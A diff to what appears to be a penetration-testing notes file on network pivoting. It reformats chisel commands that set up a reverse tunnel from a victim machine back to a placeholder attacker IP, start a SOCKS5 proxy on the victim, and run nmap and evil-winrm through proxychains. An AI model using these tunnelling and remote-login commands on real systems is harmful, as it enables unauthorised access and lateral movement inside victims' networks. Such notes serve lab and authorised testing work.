@@ -23,14 +23,22 @@ add socks5 127.0.0.1 1080
 
 Setting up chisel:
 
-Attackers Box: ./chisel server -p 8000 --reverse
-Victims Box: .\chisel.exe client <attackerIP>:8000 R:8001:127.0.0.1:1337
-Victims Box: .\chisel.exe server -p 1337 --socks5
-Attackers Box: ./chisel client 127.0.0.1:8001 socks
+attackers box: 
+./chisel server -p 8000 --reverse
+
+victims box:
+.\chisel.exe client <attackersIP>:8000 R:8001:127.0.0.1:1337
+
+victims box:
+.\chisel.exe server -p 1337 --socks5
+
+attackers box:
+./chisel client 127.0.0.1:8001 socks
 
 Testing proxychains command:
 
-proxychains nmap -sT <IP> -p <PORT> --min-rate=6000 -Pn
+proxychains nmap -sT <TargetIP> -p445 -Pn
+proxychains evil-winrm.rb -i <IP> -u user -p pass
 ```
 
 Standard Proxychains:  
